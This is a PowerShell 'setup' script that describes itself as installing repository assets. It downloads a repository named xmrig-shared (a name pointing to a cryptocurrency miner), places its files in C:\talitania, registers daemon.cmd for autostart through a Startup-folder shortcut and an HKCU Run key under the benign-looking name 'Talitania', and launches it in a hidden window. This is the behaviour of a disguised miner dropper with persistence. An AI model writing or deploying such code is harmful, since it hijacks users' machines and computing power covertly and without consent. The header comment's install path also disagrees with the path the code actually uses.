<#
  setup.ps1 — instala e configura assets do repositório em C:\xmrig-shared

  O que faz:
  - baixa o ZIP do branch main do repositório
  - extrai e copia a pasta `assets` para C:\xmrig-shared\assets
  - cria um atalho na pasta Startup do usuário para `assets\daemon.cmd`
  - cria/atualiza uma entrada em HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    para iniciar `assets\daemon.cmd` no login do usuário
  - executa `assets\daemon.cmd` uma vez no final

  Observações:
  - Execute em PowerShell com privilégios de usuário; se arquivos exigir
    drivers/instalação elevadas, execute como Administrador.
  - Repositório: https://github.com/5q0r/xmrig-shared
#>

[CmdletBinding()]
param()

function Write-Info($m) { Write-Host "[INFO] $m" }
function Write-Warn($m) { Write-Warning "[WARN] $m" }

# Logging helper (append to log file and show)
function Log-Write($level, $msg) {
    try {
        $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
        # 表示用のレベル表記を日本語に変換（内部のロジックは level で判断）
        switch ($level) {
            'ERROR' { $disp = 'エラー' }
            'WARN'  { $disp = '警告' }
            default { $disp = '情報' }
        }
        $line = "{0} [{1}] {2}" -f $ts, $disp, $msg
        if ($Global:LogFile) { Add-Content -Path $Global:LogFile -Value $line -ErrorAction SilentlyContinue }
        switch ($level) {
            'ERROR' { Write-Error $msg }
            'WARN'  { Write-Warn $msg }
            default { Write-Host $line }
        }
    } catch {
        Write-Host "[LOG-ERROR] $_"
    }
}

try {
    $RepoUrl = 'https://github.com/5q0r/xmrig-shared'
    $ZipUrl = "$RepoUrl/archive/refs/heads/main.zip"
    $TempZip = Join-Path $env:TEMP 'xmrig-shared.zip'
    $TempExtract = Join-Path $env:TEMP 'xmrig-shared-extract'
    $Destino = 'C:\talitania'
    $Startup = [Environment]::GetFolderPath('Startup')
    $ShortcutPath = Join-Path $Startup 'Talitania.lnk'
    $RunName = 'Talitania Daemon'

    # Ensure destination exists and log file path
    if (-not (Test-Path $Destino)) {
        New-Item -Path $Destino -ItemType Directory | Out-Null
    }
    $Global:LogFile = Join-Path $Destino 'setup.log'
    Log-Write 'INFO' "スクリプト開始。宛先: $Destino"
    Log-Write 'INFO' "ユーザー: $($env:USERNAME); コンピューター: $($env:COMPUTERNAME); PSVersion: $($PSVersionTable.PSVersion)"

    Log-Write 'INFO' 'リポジトリ (branch main) をダウンロード中...'
    Invoke-WebRequest -Uri $ZipUrl -OutFile $TempZip -UseBasicParsing -ErrorAction Stop
    Log-Write 'INFO' "ZIP を保存しました: $TempZip"

    if (Test-Path $TempExtract) { Remove-Item -Recurse -Force $TempExtract }
    Log-Write 'INFO' "ZIP を展開中: $TempExtract"
    Expand-Archive -Path $TempZip -DestinationPath $TempExtract -Force
    Remove-Item $TempZip -Force
    Log-Write 'INFO' '展開完了。'

    $pastaExtraida = Get-ChildItem -Path $TempExtract | Where-Object { $_.PSIsContainer } | Select-Object -First 1
    if (-not $pastaExtraida) { throw 'Não foi possível localizar a pasta extraída do repositório.' }
    $sourcePath = $pastaExtraida.FullName
    Log-Write 'INFO' "展開フォルダ: $sourcePath"

    # Copiar conteúdo de assets para o diretório raiz de destino (não criar subpasta 'assets')
    $sourceAssets = Join-Path $sourcePath 'assets'
    if (Test-Path $sourceAssets) {
    Log-Write 'INFO' "assets の内容を $Destino にコピーしています..."
        # Copia todos os itens dentro de assets para o destino (arquivos e pastas)
        Copy-Item -Path (Join-Path $sourceAssets '*') -Destination $Destino -Recurse -Force
    Log-Write 'INFO' 'assets のコピー完了。'
    } else {
        Log-Write 'WARN' 'リポジトリに assets フォルダが見つかりません。'
    }

    # Copiar arquivos úteis (README, LICENSE) se existirem
    foreach ($f in @('README.md','LICENSE')) {
        $s = Join-Path $sourcePath $f
    if (Test-Path $s) { Copy-Item -Path $s -Destination $Destino -Force; Log-Write 'INFO' "$f をコピーしました" }
    }

    # Limpeza
    Remove-Item -Recurse -Force $TempExtract
    Log-Write 'INFO' '一時ファイルのクリーンアップ完了。'

    # Preparar atalho de inicialização e registro Run para daemon
    $daemonPath = Join-Path $Destino 'daemon.cmd'
    if (Test-Path $daemonPath) {
    Log-Write 'INFO' "スタートアップフォルダにショートカットを作成します: $ShortcutPath"
        $wsh = New-Object -ComObject WScript.Shell
        $shortcut = $wsh.CreateShortcut($ShortcutPath)
        $shortcut.TargetPath = $daemonPath
        $shortcut.WorkingDirectory = Split-Path $daemonPath -Parent
        $shortcut.IconLocation = $daemonPath
        $shortcut.Save()

    Log-Write 'INFO' 'ログイン時にデーモンを起動するため、HKCU Run にエントリを作成/更新します...'
        $regValue = '"' + $daemonPath + '"'
        Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name $RunName -Value $regValue

        Log-Write 'INFO' 'デーモンを一度実行します（バックグラウンド）...'
        Start-Process -FilePath $daemonPath -WindowStyle Hidden
        Log-Write 'INFO' 'デーモンを起動しました（単回実行）。'
    } else {
        Log-Write 'WARN' "$daemonPath が見つかりません — ショートカット/登録はスキップします。"
    }

    Log-Write 'INFO' 'セットアップ完了。'
    exit 0

} catch {
    Log-Write 'ERROR' "セットアップ中にエラーが発生しました: $_"
    exit 1
}